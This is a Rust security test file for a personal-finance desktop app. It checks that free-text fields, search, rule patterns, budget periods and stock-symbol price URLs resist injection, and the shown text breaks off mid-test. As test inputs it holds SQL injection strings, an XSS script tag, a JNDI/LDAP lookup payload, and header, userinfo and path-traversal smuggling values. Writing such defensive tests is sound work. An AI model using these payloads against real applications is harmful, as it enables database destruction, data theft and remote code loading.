//! Hostile text going in, and what comes back out.
//!
//! Three promises are pinned here.
//!
//! 1. "SQL injection: prepared statements only." Every free-text field the app
//!    takes is given the strings that have broken other programs, and has to
//!    come back byte for byte with every table still in place. A `%` or `_`
//!    has to be a character, never a wildcard.
//! 2. "Export: files in a form a spreadsheet opens." A cell that begins with
//!    `=`, `+`, `-`, `@`, a tab or a carriage return is *run* by Excel,
//!    LibreOffice and Sheets. A payee name on a bank statement is text a
//!    stranger chose, so it must not survive into the export as a formula, and
//!    a real negative amount must stay a number. Names in the book must not
//!    steer where files are written, and an export must never replace one that
//!    is already there.
//! 3. Removing things leaves nothing behind and takes nothing else: the sample
//!    household, an import, a transaction, a holding, an account.
//!
//! The commands take Tauri's `State`, which only a running app can build, and
//! this crate does not turn on tauri's `test` feature. `command_state` below
//! is the single place that gets around that. If it is ever unwelcome, delete
//! it together with `Book::st` and the tests that call a command; the tests
//! that call the library functions directly stand on their own.
//!
//! A test marked `#[ignore = "FINDING: ..."]` asserts the *correct* behaviour
//! and currently fails: it is a defect, not a flaky test. Run them with
//! `cargo test --test security_injection_export -- --ignored`.
#![cfg_attr(not(unix), allow(dead_code, unused_imports))]

use chrono::NaiveDate;
use coin_heaven_lib::commands::autocat::{self, Assignment};
use coin_heaven_lib::commands::budget;
use coin_heaven_lib::commands::export::{ExportOutcome, Style, data_export, export_all};
use coin_heaven_lib::commands::import::{account_create, apply_rules, rule_list, rule_save};
use coin_heaven_lib::commands::ledger::{
    self, EventInput, TxnEdit, TxnFilter, category_save, event_save, txn_link_reimbursement,
    txn_list, txn_update,
};
use coin_heaven_lib::commands::plan::{self, PlanItem};
use coin_heaven_lib::commands::portfolio::{holding_delete, holding_save, sync_snapshot};
use coin_heaven_lib::commands::sample;
use coin_heaven_lib::commands::settings::category_delete;
use coin_heaven_lib::commands::wealth::{
    SnapshotInput, WealthLine, asset_class_save, snapshot_delete, snapshot_list, snapshot_save,
};
use coin_heaven_lib::db::Db;
use coin_heaven_lib::error::{AppError, AppResult};
use coin_heaven_lib::import::merchant;
use coin_heaven_lib::import::parser::{ParseResult, ParsedRow};
use coin_heaven_lib::import::rules::Rule;
use coin_heaven_lib::import::runner::{self, ImportSummary};
use coin_heaven_lib::market;
use coin_heaven_lib::money::Money;
use coin_heaven_lib::security::pii::normalise_description;
use coin_heaven_lib::state::AppState;
use rusqlite::params;
use secrecy::SecretString;
use std::collections::{BTreeMap, BTreeSet};
use std::path::Path;
use tauri::State;

/* ------------------------------------------------------------- harness -- */

/// What a running Tauri app would hand a command.
///
/// `State` is a one-field wrapper around `&T` and has no public constructor
/// outside tauri's own test feature. The assertion keeps this honest: if the
/// wrapper ever grows, this stops compiling instead of reading garbage.
fn command_state(app: &AppState) -> State<'_, AppState> {
    const _: () = assert!(
        std::mem::size_of::<State<'static, AppState>>() == std::mem::size_of::<&AppState>()
    );
    // SAFETY: both types are a single shared reference to the same `AppState`
    // (size checked above), and the result borrows `app` for as long as it
    // does. Nothing is ever written through it.
    unsafe { std::mem::transmute::<&AppState, State<'_, AppState>>(app) }
}

/// Tables that must exist after anything at all has happened to the book.
const CORE_TABLES: [&str; 12] = [
    "account",
    "txn",
    "pl_category",
    "project_event",
    "import_batch",
    "categorization_rule",
    "budget",
    "holding",
    "wealth_snapshot",
    "wealth_line",
    "plan_item",
    "app_setting",
];

/// A real encrypted database in a temp dir, behind the real `AppState`.
struct Book {
    // Held so the folder lives as long as the book does.
    _dir: tempfile::TempDir,
    app: AppState,
    tables: Vec<String>,
}

impl Book {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let app = AppState::new(dir.path().to_path_buf());
        let db = Db::open(
            &dir.path().join("atlas.db"),
            &SecretString::from("0".repeat(64)),
        )
        .unwrap();
        app.set_db(db).unwrap();
        let tables = table_names(app.db().unwrap());
        for t in CORE_TABLES {
            assert!(tables.iter().any(|n| n == t), "schema has no {t}");
        }
        Book {
            _dir: dir,
            app,
            tables,
        }
    }

    fn db(&self) -> &Db {
        self.app.db().unwrap()
    }

    /// The handle commands are given.
    fn st(&self) -> State<'_, AppState> {
        command_state(&self.app)
    }

    /// Nothing was dropped, nothing is corrupt, every foreign key still holds.
    fn assert_intact(&self) {
        assert_eq!(table_names(self.db()), self.tables, "a table came or went");
        let verdict: String = one(self.db(), "PRAGMA integrity_check", []);
        assert_eq!(verdict, "ok");
        assert_eq!(orphans(self.db()), Vec::<String>::new());
        assert_eq!(
            one::<i64>(self.db(), "SELECT count(*) FROM currency", []),
            24
        );
    }
}

fn table_names(db: &Db) -> Vec<String> {
    db.with(|c| {
        let mut st =
            c.prepare("SELECT name FROM sqlite_master WHERE type = 'table' ORDER BY name")?;
        Ok(st
            .query_map([], |r| r.get(0))?
            .collect::<Result<Vec<String>, _>>()?)
    })
    .unwrap()
}

fn one<T: rusqlite::types::FromSql>(db: &Db, sql: &str, p: impl rusqlite::Params) -> T {
    db.with(|c| Ok(c.query_row(sql, p, |r| r.get(0))?)).unwrap()
}

fn exec(db: &Db, sql: &str, p: impl rusqlite::Params) {
    db.with(|c| {
        c.execute(sql, p)?;
        Ok(())
    })
    .unwrap();
}

/// Everything in a column, in order.
fn column(db: &Db, sql: &str) -> Vec<String> {
    db.with(|c| {
        let mut st = c.prepare(sql)?;
        Ok(st
            .query_map([], |r| r.get(0))?
            .collect::<Result<Vec<String>, _>>()?)
    })
    .unwrap()
}

fn ids(db: &Db, sql: &str) -> BTreeSet<i64> {
    db.with(|c| {
        let mut st = c.prepare(sql)?;
        Ok(st
            .query_map([], |r| r.get(0))?
            .collect::<Result<BTreeSet<i64>, _>>()?)
    })
    .unwrap()
}

/// Rows that point at something that is not there: what the foreign keys
/// would report, plus the references the schema cannot declare.
fn orphans(db: &Db) -> Vec<String> {
    db.with(|c| {
        let mut out = Vec::new();
        let mut st = c.prepare("PRAGMA foreign_key_check")?;
        let rows = st.query_map([], |r| {
            Ok(format!(
                "{} row {:?} has no {}",
                r.get::<_, String>(0)?,
                r.get::<_, Option<i64>>(1)?,
                r.get::<_, String>(2)?
            ))
        })?;
        for r in rows {
            out.push(r?);
        }
        let stale: i64 = c.query_row(
            "SELECT count(*) FROM wealth_line l
              WHERE l.source = 'holding'
                AND NOT EXISTS (SELECT 1 FROM holding h WHERE h.id = l.source_id)",
            [],
            |r| r.get(0),
        )?;
        if stale > 0 {
            out.push(format!(
                "{stale} net-worth line(s) computed from a holding that no longer exists"
            ));
        }
        Ok(out)
    })
    .unwrap()
}

fn day(s: &str) -> NaiveDate {
    NaiveDate::parse_from_str(s, "%Y-%m-%d").unwrap()
}

fn account(b: &Book, name: &str) -> i64 {
    account_create(b.st(), name.into(), "checking".into(), "EUR".into(), None).unwrap()
}

fn category(db: &Db, name: &str) -> i64 {
    one(db, "SELECT id FROM pl_category WHERE name = ?1", [name])
}

fn row(date: &str, description: &str, minor: i64) -> ParsedRow {
    ParsedRow {
        line: 2,
        booked_on: date.into(),
        amount_minor: Money::from_minor(minor),
        description: description.into(),
        counterparty: None,
    }
}

/// Import through the real runner, as `import_run` does after parsing.
fn import(db: &Db, account_id: i64, filename: &str, rows: Vec<ParsedRow>) -> ImportSummary {
    let parsed = ParseResult {
        rows,
        rejected: Vec::new(),
        headers: Vec::new(),
    };
    runner::run(
        db,
        account_id,
        None,
        filename,
        &runner::file_sha256(filename.as_bytes()),
        &parsed,
        "EUR",
    )
    .unwrap()
}

fn ids_in_batch(db: &Db, batch: i64) -> BTreeSet<i64> {
    ids(
        db,
        &format!("SELECT id FROM txn WHERE import_batch_id = {batch}"),
    )
}

fn id_of(db: &Db, description: &str, account_id: i64) -> i64 {
    one(
        db,
        "SELECT id FROM txn WHERE description_raw = ?1 AND account_id = ?2",
        params![description, account_id],
    )
}

fn no_edit() -> TxnEdit {
    TxnEdit {
        booked_on: None,
        description: None,
        amount_minor: None,
        account_id: None,
        counterparty: None,
        category_id: None,
        clear_category: None,
        project_id: None,
        clear_project: None,
        parent_txn_id: None,
        clear_parent: None,
        is_neutral_transfer: None,
        notes: None,
    }
}

fn rule(pattern: &str, kind: &str, category_id: i64) -> Rule {
    Rule {
        id: None,
        name: format!("rule for {pattern}"),
        priority: 100,
        match_kind: kind.into(),
        pattern: pattern.into(),
        account_id: None,
        min_amount_minor: None,
        max_amount_minor: None,
        set_category_id: Some(category_id),
        set_project_id: None,
        set_neutral_transfer: false,
        is_enabled: true,
    }
}

/// The strings that have hurt other programs. All of it is data: the property
/// under test is that it is stored and read back untouched, and that nothing
/// else happens as a result.
fn hostile_text() -> Vec<String> {
    let mut v: Vec<String> = [
        // Statement terminators, comments and quotes.
        "'; DROP TABLE txn;--",
        "\"; DROP TABLE account; --",
        "Robert'); DELETE FROM txn; --",
        "' OR '1'='1",
        "'; ATTACH DATABASE '/tmp/coin-heaven-x' AS x; --",
        "x' UNION SELECT name FROM sqlite_master --",
        // LIKE and GLOB metacharacters, and the escape character.
        "%",
        "_",
        "%_%",
        "\\",
        "\\%",
        "\\_",
        "[a-z]*",
        "?",
        // A NUL, which C strings end at.
        "before\0after",
        // The same word composed and decomposed.
        "caf\u{e9}",
        "cafe\u{301}",
        // Ligature, fullwidth letters, right-to-left override, zero-width.
        "\u{fb01}nance",
        "\u{ff21}\u{ff23}\u{ff2d}\u{ff25}",
        "\u{202e}gnp.exe",
        "\u{200b}",
        // Emoji, with and without joiners.
        "\u{1f600} \u{1f1ea}\u{1f1f8}",
        // Markup that is somebody else's problem, but must not be altered.
        "<script>alert(1)</script>",
        "{{7*7}} ${jndi:ldap://x}",
        // Line breaks and tabs inside a value.
        "line one\r\nline two",
        "tab\tseparated",
        "\n",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    v.push("x".repeat(100_000));
    v
}

/* ---------------------------------------------------- SQL: free-text -- */

#[test]
fn hostile_descriptions_go_through_an_import_and_come_back_exactly() {
    let b = Book::new();
    let acct = account(&b, "Main");
    let texts = hostile_text();
    let rows: Vec<ParsedRow> = texts
        .iter()
        .enumerate()
        .map(|(i, t)| ParsedRow {
            counterparty: Some(t.clone()),
            ..row("2026-03-01", t, -(i as i64) - 1)
        })
        .collect();

    // The file name is attacker-chosen too.
    let filename = "'; DROP TABLE txn;--.csv";
    let summary = import(b.db(), acct, filename, rows);
    assert_eq!(summary.inserted, texts.len());

    // Amounts run -1, -2, ... so descending order is the order they went in.
    let back = b
        .db()
        .with(|c| {
            let mut st = c.prepare(
                "SELECT description_raw, counterparty, description_norm FROM txn
                 ORDER BY amount_minor DESC",
            )?;
            Ok(st
                .query_map([], |r| {
                    Ok((
                        r.get::<_, String>(0)?,
                        r.get::<_, Option<String>>(1)?,
                        r.get::<_, String>(2)?,
                    ))
                })?
                .collect::<Result<Vec<_>, _>>()?)
        })
        .unwrap();
    assert_eq!(back.len(), texts.len());
    for (t, (raw, counterparty, norm)) in texts.iter().zip(&back) {
        assert_eq!(raw.len(), t.len(), "description changed length");
        assert_eq!(raw, t, "description did not round-trip");
        assert_eq!(counterparty.as_deref(), Some(t.as_str()));
        assert_eq!(norm, &normalise_description(t));
    }
    let stored: Option<String> = one(b.db(), "SELECT source_filename FROM import_batch", []);
    assert_eq!(stored.as_deref(), Some(filename));
    b.assert_intact();
    assert_eq!(one::<i64>(b.db(), "SELECT count(*) FROM account", []), 1);
}

#[test]
fn a_hundred_kilobyte_description_is_listed_whole() {
    let b = Book::new();
    let acct = account(&b, "Main");
    let big = "x".repeat(100_000);
    import(b.db(), acct, "big.csv", vec![row("2026-03-01", &big, -100)]);

    let ledger = txn_list(b.st(), TxnFilter::default()).unwrap();
    assert_eq!(ledger.total, 1);
    assert_eq!(ledger.rows[0].description.len(), 100_000);
    assert_eq!(ledger.rows[0].merchant.as_deref(), Some(big.as_str()));
}

#[test]
fn names_notes_and_labels_round_trip_through_every_command_that_takes_them() {
    let b = Book::new();
    let housing = category(b.db(), "Housing");
    let mut kept = 0;

    for t in hostile_text() {
        let want = t.trim();
        if want.is_empty() {
            continue; // refused, and tested as refused below
        }
        kept += 1;

        let id = account_create(
            b.st(),
            t.clone(),
            "checking".into(),
            "EUR".into(),
            Some(t.clone()),
        )
        .unwrap();
        let (name, institution): (String, Option<String>) = b
            .db()
            .with(|c| {
                Ok(c.query_row(
                    "SELECT name, institution FROM account WHERE id = ?1",
                    [id],
                    |r| Ok((r.get(0)?, r.get(1)?)),
                )?)
            })
            .unwrap();
        assert_eq!(name, want, "account name");
        assert_eq!(institution.as_deref(), Some(t.as_str()), "institution");

        let id = category_save(b.st(), None, t.clone(), "expense".into(), Some(t.clone())).unwrap();
        let (name, color): (String, Option<String>) = b
            .db()
            .with(|c| {
                Ok(c.query_row(
                    "SELECT name, color FROM pl_category WHERE id = ?1",
                    [id],
                    |r| Ok((r.get(0)?, r.get(1)?)),
                )?)
            })
            .unwrap();
        assert_eq!(name, want, "category name");
        assert_eq!(color.as_deref(), Some(t.as_str()), "category colour");

        let id = event_save(
            b.st(),
            None,
            EventInput {
                name: t.clone(),
                default_category_id: housing,
                starts_on: None,
                ends_on: None,
                budget_minor: None,
                notes: Some(t.clone()),
            },
        )
        .unwrap();
        let (name, notes): (String, Option<String>) = b
            .db()
            .with(|c| {
                Ok(c.query_row(
                    "SELECT name, notes FROM project_event WHERE id = ?1",
                    [id],
                    |r| Ok((r.get(0)?, r.get(1)?)),
                )?)
            })
            .unwrap();
        assert_eq!(name, want, "event name");
        assert_eq!(notes.as_deref(), Some(t.as_str()), "event notes");

        let id = holding_save(b.st(), None, t.clone(), Some(t.clone()), "equities".into()).unwrap();
        let (name, symbol): (String, Option<String>) = b
            .db()
            .with(|c| {
                Ok(c.query_row(
                    "SELECT name, symbol FROM holding WHERE id = ?1",
                    [id],
                    |r| Ok((r.get(0)?, r.get(1)?)),
                )?)
            })
            .unwrap();
        assert_eq!(name, want, "holding name");
        assert_eq!(symbol.as_deref(), Some(want), "holding symbol");

        // The key a class is filed under is derived from its name, and is the
        // one place free text becomes an identifier.
        let key = asset_class_save(
            b.st(),
            None,
            t.clone(),
            "liquid".into(),
            Some(t.clone()),
            false,
        )
        .unwrap();
        assert!(
            !key.is_empty()
                && key
                    .chars()
                    .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_'),
            "class key {key:?} is not a plain slug"
        );
        let (name, color): (String, Option<String>) = b
            .db()
            .with(|c| {
                Ok(c.query_row(
                    "SELECT name, color FROM asset_class WHERE key = ?1",
                    [&key],
                    |r| Ok((r.get(0)?, r.get(1)?)),
                )?)
            })
            .unwrap();
        assert_eq!(name, want, "asset class name");
        assert_eq!(color.as_deref(), Some(t.as_str()));
    }
    assert!(kept > 20);

    // Plan boxes keep their own order, trim, and stop at 80 characters.
    let items: Vec<PlanItem> = hostile_text()
        .into_iter()
        .map(|t| PlanItem {
            kind: "expense".into(),
            name: t,
            amount_minor: 100,
        })
        .collect();
    b.db().with(|c| plan::save(c, "2026-05", &items)).unwrap();
    let plans = b.db().with(plan::list).unwrap();
    let stored: Vec<&str> = plans[0].items.iter().map(|i| i.name.as_str()).collect();
    for (item, got) in items.iter().zip(stored) {
        let want: String = item.name.trim().chars().take(80).collect();
        assert_eq!(got, want, "plan box name");
    }

    // A net-worth snapshot: its label and every line's label and currency.
    let texts = hostile_text();
    let lines: Vec<WealthLine> = texts
        .iter()
        .map(|t| WealthLine {
            id: None,
            bucket: "cash".into(),
            label: t.clone(),
            gross_value_minor: 100,
            debt_minor: 0,
            currency: t.clone(),
            source: "manual".into(),
        })
        .collect();
    snapshot_save(
        b.st(),
        None,
        SnapshotInput {
            taken_on: "2026-06-30".into(),
            label: Some(texts[0].clone()),
            lines,
        },
    )
    .unwrap();
    let snaps = snapshot_list(b.st()).unwrap();
    assert_eq!(snaps.len(), 1);
    assert_eq!(snaps[0].label.as_deref(), Some(texts[0].as_str()));
    let mut got: Vec<(String, String)> = snaps[0]
        .lines
        .iter()
        .map(|l| (l.label.clone(), l.currency.clone()))
        .collect();
    let mut want: Vec<(String, String)> = texts.iter().map(|t| (t.clone(), t.clone())).collect();
    got.sort();
    want.sort();
    assert_eq!(got, want);

    // Every statement above was a statement, and only that.
    assert_eq!(one::<i64>(b.db(), "SELECT count(*) FROM txn", []), 0);
    b.assert_intact();
}

#[test]
fn a_name_that_is_only_whitespace_is_refused_everywhere() {
    let b = Book::new();
    let housing = category(b.db(), "Housing");
    for blank in ["", " ", "\t", "\r\n", "\u{a0}", "\u{2003}"] {
        assert!(matches!(
            account_create(b.st(), blank.into(), "checking".into(), "EUR".into(), None),
            Err(AppError::Invalid(_))
        ));
        assert!(matches!(
            category_save(b.st(), None, blank.into(), "expense".into(), None),
            Err(AppError::Invalid(_))
        ));
        assert!(matches!(
            event_save(
                b.st(),
                None,
                EventInput {
                    name: blank.into(),
                    default_category_id: housing,
                    starts_on: None,
                    ends_on: None,
                    budget_minor: None,
                    notes: None,
                }
            ),
            Err(AppError::Invalid(_))
        ));
        assert!(matches!(
            holding_save(b.st(), None, blank.into(), None, "equities".into()),
            Err(AppError::Invalid(_))
        ));
    }
    assert_eq!(one::<i64>(b.db(), "SELECT count(*) FROM account", []), 0);
}

#[test]
fn editing_a_transaction_with_hostile_text_stores_it_and_nothing_more() {
    let b = Book::new();
    let acct = account(&b, "Main");
    import(
        b.db(),
        acct,
        "m.csv",
        vec![row("2026-03-01", "ORIGINAL", -500)],
    );
    let id = id_of(b.db(), "ORIGINAL", acct);

    for t in hostile_text() {
        let want = t.trim();
        if want.is_empty() {
            continue;
        }
        txn_update(
            b.st(),
            id,
            TxnEdit {
                description: Some(t.clone()),
                counterparty: Some(t.clone()),
                notes: Some(t.clone()),
                ..no_edit()
            },
        )
        .unwrap();
        let ledger = txn_list(b.st(), TxnFilter::default()).unwrap();
        assert_eq!(ledger.total, 1, "an edit must not add or remove rows");
        let r = &ledger.rows[0];
        assert_eq!(r.description, want);
        assert_eq!(r.counterparty.as_deref(), Some(want));
        assert_eq!(r.notes.as_deref(), Some(want));
        let norm: String = one(b.db(), "SELECT description_norm FROM txn", []);
        assert_eq!(norm, normalise_description(&t));
    }
    // The amount and the date were never part of any of those edits.
    assert_eq!(one::<i64>(b.db(), "SELECT amount_minor FROM txn", []), -500);
    b.assert_intact();
}

/* --------------------------------------------- LIKE: literal, not wild -- */

#[test]
fn what_reaches_a_like_clause_can_hold_no_wildcard_and_no_escape() {
    // The ledger search is `description_norm LIKE '%' || normalised || '%'`
    // with no ESCAPE clause. It is only safe because normalisation leaves
    // letters and single spaces: that is the property this pins.
    for t in hostile_text() {
        let n = normalise_description(&t);
        assert!(
            n.chars().all(|c| c.is_alphabetic() || c == ' '),
            "{n:?} still holds a character LIKE treats specially"
        );
        assert!(!n.contains("  ") && n == n.trim(), "{n:?} is not squeezed");
    }
}

#[test]
fn a_search_treats_percent_and_underscore_as_characters_not_wildcards() {
    let b = Book::new();
    let acct = account(&b, "Main");
    import(
        b.db(),
        acct,
        "s.csv",
        vec![
            row("2026-03-01", "ACME ANVILS", -100),
            row("2026-03-02", "A_B CLUB", -200),
            row("2026-03-03", "50% OFF SALE", -300),
            row("2026-03-04", "BACK\\SLASH", -400),
            row("2026-03-05", "DROP TABLE TXN LTD", -500),
        ],
    );
    let found = |q: &str| {
        txn_list(
            b.st(),
            TxnFilter {
                search: Some(q.into()),
                ..Default::default()
            },
        )
        .unwrap()
        .total
    };

    assert_eq!(found("acme"), 1);
    assert_eq!(found("ACME"), 1, "case does not matter");
    // `_` would match any one character and `%` any run of them. Neither may.
    assert_eq!(found("ac_e"), 0, "underscore acted as a wildcard");
    assert_eq!(found("a%e"), 0, "percent acted as a wildcard");
    // The characters are separators, exactly as in the stored description.
    assert_eq!(found("a_b"), 1);
    assert_eq!(found("off sale"), 1);
    assert_eq!(found("back\\slash"), 1);
    // An injection attempt is a search for the words in it.
    assert_eq!(found("'; DROP TABLE txn;--"), 1);
    assert_eq!(found("\" OR 1=1 --"), 0);
    b.assert_intact();
    assert_eq!(one::<i64>(b.db(), "SELECT count(*) FROM txn", []), 5);
}

#[test]
fn a_search_of_only_punctuation_is_the_same_as_no_search() {
    // Documented, not endorsed: a search made only of characters that
    // normalise to nothing ("%", "_", "...") is not a search for those
    // characters, because descriptions are stored without them. It shows the
    // whole ledger, the same as a blank box.
    let b = Book::new();
    let acct = account(&b, "Main");
    import(
        b.db(),
        acct,
        "s.csv",
        vec![
            row("2026-03-01", "ACME", -100),
            row("2026-03-02", "50% OFF", -200),
        ],
    );
    for q in ["%", "_", "%%%", "\\", "...", "123"] {
        let total = txn_list(
            b.st(),
            TxnFilter {
                search: Some(q.into()),
                ..Default::default()
            },
        )
        .unwrap()
        .total;
        assert_eq!(total, 2, "searching {q:?}");
    }
}

#[test]
fn budget_periods_that_are_not_a_year_or_a_month_are_refused_before_any_like() {
    let b = Book::new();
    let food = category(b.db(), "Food & groceries");
    b.db()
        .with(|c| {
            for p in ["2025", "2026", "2026-01", "2026-02", "2027-01"] {
                budget::save(c, food, p, 1_000)?;
            }
            Ok(())
        })
        .unwrap();
    let before = column(b.db(), "SELECT period FROM budget ORDER BY period");
    assert_eq!(before.len(), 5);

    // `2026` + `-%` is how a year finds its months. If a caller could put a
    // wildcard in the period, one save would sweep other years' budgets.
    for bad in [
        "%",
        "20%",
        "2026-%",
        "____",
        "20_6",
        "2026-_1",
        "2026-1%",
        "2026-13",
        "2026-00",
        "2026\n",
        " 2026",
        "\u{ff12}\u{ff10}\u{ff12}\u{ff16}",
        "'; DROP TABLE budget;--",
        "",
    ] {
        let r = b.db().with(|c| budget::save(c, food, bad, 1));
        assert!(
            matches!(r, Err(AppError::Invalid(_))),
            "{bad:?} was accepted as a period"
        );
        let r = b.db().with(|c| budget::save_every_month(c, food, -1, -5));
        assert!(r.is_err());
    }
    assert_eq!(
        column(b.db(), "SELECT period FROM budget ORDER BY period"),
        before,
        "a refused period still changed the budgets"
    );
    b.assert_intact();
}

#[test]
fn a_period_with_a_multi_byte_character_is_refused_not_a_panic() {
    let b = Book::new();
    let food = category(b.db(), "Food & groceries");
    for bad in ["202é-1", "20é-12", "2\u{20ac}-12", "\u{1f600}-12"] {
        assert_eq!(bad.len(), 7, "the case needs exactly 7 bytes");
        let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            b.db().with(|c| budget::save(c, food, bad, 1))
        }));
        let r = outcome.unwrap_or_else(|_| panic!("saving a budget for {bad:?} panicked"));
        assert!(matches!(r, Err(AppError::Invalid(_))), "{bad:?}: {r:?}");
    }
}

#[test]
fn plan_months_that_are_not_a_month_are_refused_without_a_panic() {
    let b = Book::new();
    b.db().with(|c| plan::save(c, "2026-01", &[])).unwrap();
    for bad in [
        "%",
        "2026-%",
        "20_6-01",
        "2026-13",
        "2026-00",
        "2026/01",
        "20é-12",
        "202\u{e9}-1",
        "\u{ff12}\u{ff10}\u{ff12}\u{ff16}-01",
        "'; DROP TABLE plan_month;--",
        "",
    ] {
        assert!(
            b.db().with(|c| plan::save(c, bad, &[])).is_err(),
            "{bad:?} saved"
        );
        assert!(
            b.db().with(|c| plan::delete(c, bad)).is_err(),
            "{bad:?} deleted"
        );
    }
    assert_eq!(b.db().with(plan::list).unwrap().len(), 1);
}

/* ------------------------------------------------- rules and merchants -- */

#[test]
fn rule_patterns_are_stored_and_matched_as_text_never_as_sql_or_wildcards() {
    let b = Book::new();
    let acct = account(&b, "Main");
    let housing = category(b.db(), "Housing");
    import(
        b.db(),
        acct,
        "r.csv",
        vec![
            row("2026-03-01", "DROP TABLE TXN LTD", -100),
            row("2026-03-02", "ACME ANVILS", -200),
            row("2026-03-03", "50% OFF", -300),
            row("2026-03-04", "UNDER_SCORE SHOP", -400),
            row("2026-03-05", "BACK\\SLASH", -500),
        ],
    );

    // Each of these is a legitimate thing for a person to paste into the
    // pattern box. None of them may match more than the words in it.
    let patterns = [
        ("contains", "'; DROP TABLE txn;--"),
        ("contains", "%"),
        ("contains", "_"),
        ("contains", "\\"),
        ("starts_with", "%"),
        ("starts_with", "_%"),
    ];
    for (kind, p) in patterns {
        rule_save(b.st(), rule(p, kind, housing)).unwrap();
    }
    let saved = rule_list(b.st()).unwrap();
    assert_eq!(saved.len(), patterns.len());
    for (r, (kind, p)) in saved.iter().zip(patterns) {
        assert_eq!(r.pattern, p, "pattern did not round-trip");
        assert_eq!(r.match_kind, kind);
    }

    let applied = apply_rules(b.db(), None).unwrap();
    assert_eq!(applied, 1, "only the row with those words may be filed");
    let filed = column(
        b.db(),
        "SELECT description_raw FROM txn WHERE category_override_id IS NOT NULL",
    );
    assert_eq!(filed, ["DROP TABLE TXN LTD"]);
    b.assert_intact();
    assert_eq!(one::<i64>(b.db(), "SELECT count(*) FROM txn", []), 5);
}

#[test]
fn every_hostile_string_survives_as_a_rule_pattern_and_name() {
    let b = Book::new();
    let housing = category(b.db(), "Housing");
    let mut wanted = Vec::new();
    for t in hostile_text() {
        if t.trim().is_empty() {
            continue;
        }
        let mut r = rule(&t, "contains", housing);
        r.name = t.clone();
        rule_save(b.st(), r).unwrap();
        wanted.push(t.trim().to_string());
    }
    let stored: Vec<String> = rule_list(b.st())
        .unwrap()
        .into_iter()
        .map(|r| r.pattern)
        .collect();
    assert_eq!(stored, wanted);
    let names: Vec<String> = column(b.db(), "SELECT name FROM categorization_rule ORDER BY id");
    assert_eq!(names, wanted);
    b.assert_intact();
}

#[test]
fn a_regular_expression_the_engine_cannot_run_cheaply_is_refused() {
    let b = Book::new();
    let housing = category(b.db(), "Housing");
    // Lookaround and backreferences are where ReDoS lives; the engine does not
    // have them. Nested counted repeats blow the compiled-size limit.
    for bad in [
        "(",
        "[",
        "(a+)+$(?=x)",
        "(a)\\1",
        "(?<=a)b",
        "(((a{100}){100}){100})",
        "a{100000}{100000}",
    ] {
        let r = rule_save(b.st(), rule(bad, "regex", housing));
        assert!(
            matches!(r, Err(AppError::Invalid(_))),
            "{bad:?} was accepted: {r:?}"
        );
    }
    assert!(rule_list(b.st()).unwrap().is_empty());
}

#[test]
fn a_broken_or_enormous_rule_already_in_the_book_cannot_take_an_import_down() {
    let b = Book::new();
    let acct = account(&b, "Main");
    let housing = category(b.db(), "Housing");
    import(
        b.db(),
        acct,
        "r.csv",
        vec![
            row("2026-03-01", "ACME ANVILS", -100),
            row("2026-03-02", &"x".repeat(100_000), -200),
        ],
    );
    // Written around the command, as a restored backup or an older version
    // might have left them.
    let enormous_alternation = format!("{}b", "a|".repeat(50_000));
    let enormous_contains = "x".repeat(100_000);
    for (kind, p) in [
        ("regex", "("),
        ("regex", "(?<=a)b"),
        ("regex", enormous_alternation.as_str()),
        ("contains", enormous_contains.as_str()),
    ] {
        exec(
            b.db(),
            "INSERT INTO categorization_rule (name, match_kind, pattern, set_category_id)
             VALUES ('r', ?1, ?2, ?3)",
            params![kind, p, housing],
        );
    }
    let started = std::time::Instant::now();
    let applied = apply_rules(b.db(), None).unwrap();
    assert!(
        started.elapsed().as_secs() < 20,
        "rules took {:?}",
        started.elapsed()
    );
    // Only the 100 kB `contains` rule has anything to match: the row with the
    // same hundred thousand letters.
    assert!(applied >= 1, "{applied}");
    let filed: i64 = one(
        b.db(),
        "SELECT count(*) FROM txn
         WHERE length(description_raw) = 100000 AND category_override_id IS NOT NULL",
        [],
    );
    assert_eq!(filed, 1);
    b.assert_intact();
}

#[test]
fn merchant_keys_are_whole_plain_words_whatever_the_description_held() {
    for t in hostile_text() {
        let norm = normalise_description(&t);
        if let Some(key) = merchant::key(&norm) {
            assert!(
                norm.split(' ').any(|w| w == key),
                "{key:?} is not a word of {norm:?}"
            );
            assert!(key.chars().all(char::is_alphabetic), "{key:?}");
        }
    }
}

#[test]
fn a_key_sent_from_the_webview_is_stored_as_the_text_it_is() {
    // `autocat_apply` takes the key from the caller, not from the ledger, so
    // it is the one place a rule pattern arrives unfiltered.
    let b = Book::new();
    let acct = account(&b, "Main");
    let housing = category(b.db(), "Housing");
    import(
        b.db(),
        acct,
        "a.csv",
        vec![row("2026-03-01", "DROP TABLE TXN LTD", -100)],
    );
    let txn = id_of(b.db(), "DROP TABLE TXN LTD", acct);
    let key = "x'); DROP TABLE categorization_rule;--";
    let out = autocat::autocat_apply(
        b.st(),
        vec![Assignment {
            txn_ids: vec![txn],
            category_id: housing,
            create_rule: true,
            key: key.into(),
        }],
    )
    .unwrap();
    assert_eq!((out.categorised, out.rules_created), (1, 1));
    let pattern: String = one(b.db(), "SELECT pattern FROM categorization_rule", []);
    assert_eq!(pattern, key);
    b.assert_intact();
    // And suggestions read from a ledger holding that text name plain words.
    let groups = b.db().with(autocat::suggest).unwrap().groups;
    for g in groups {
        assert!(g.key.chars().all(char::is_alphabetic), "{:?}", g.key);
    }
}

/* ------------------------------------------------ lookups by symbol ---- */

#[test]
fn a_holding_symbol_cannot_add_parameters_or_change_the_host_of_a_price_lookup() {
    let from = day("2026-01-01");
    let to = day("2026-02-01");
    let symbols = [
        "AAPL",
        "BRK-B",
        "AAPL?apikey=1&period1=0",
        "AAPL&interval=1mo",
        "A/B",
        "A#fragment",
        "../../v7/finance/quote",
        "a b",
        "\r\nHost: evil.example",
        "evil.example\u{40}query1.finance.yahoo.com", // userinfo trick: U+0040 is "at"
        "%2e%2e%2fadmin",
        "\u{ff21}\u{ff30}\u{ff30}",
    ];
    for s in symbols {
        let url = reqwest::Url::parse(&market::chart_url(s, from, to)).unwrap();
        assert_eq!(url.scheme(), "https", "{s:?}");
        assert_eq!(url.host_str(), Some("query1.finance.yahoo.com"), "{s:?}");
        assert!(
            url.username().is_empty() && url.fragment().is_none(),
            "{s:?}"
        );
        let keys: Vec<String> = url.query_pairs().map(|(k, _)| k.into_owned()).collect();
        assert_eq!(keys, ["period1", "period2", "interval"], "{s:?}");
